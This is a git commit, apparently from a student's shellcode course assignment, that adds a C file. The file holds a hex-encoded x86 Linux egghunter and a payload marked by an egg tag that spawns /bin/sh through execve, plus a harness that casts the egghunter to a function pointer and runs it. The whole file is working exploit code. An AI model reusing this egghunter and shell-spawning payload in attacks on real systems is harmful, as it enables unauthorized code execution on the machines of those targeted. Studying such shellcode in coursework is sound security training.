17c1c1ed8790693491a4bbca72e8286981dd02ff
strikergoutham <strikergoutham@gmail.com>
2018-11-24 12:08:21 +0530

    Create shellcode.c

---
+++ Assingment3/shellcode.c
@@ -0,0 +1,25 @@
+#include<stdio.h>
+#include<string.h>
+
+
+#define EGG "\x90\x50\x90\x50"
+
+unsigned char egghunter[] ="\x31\xdb\x66\x81\xcb\xff\x0f\x43\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xf1\x89\xdf\xb8\x90\x50\x90\x50\xaf\x75\xec\xaf\x75\xe9\xff\xe7";
+
+// simple spawn a shell shellcode payload
+unsigned char code[] = \
+EGG EGG
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
+
+main()
+{
+	
+	printf("Egghunter Length:  %d\n", strlen(egghunter));
+	printf("Shellcode Length:  %d\n", strlen(code));
+
+	//calling egghunter 
+	int (*ret)() = (int(*)())egghunter;
+
+	ret();
+
+}
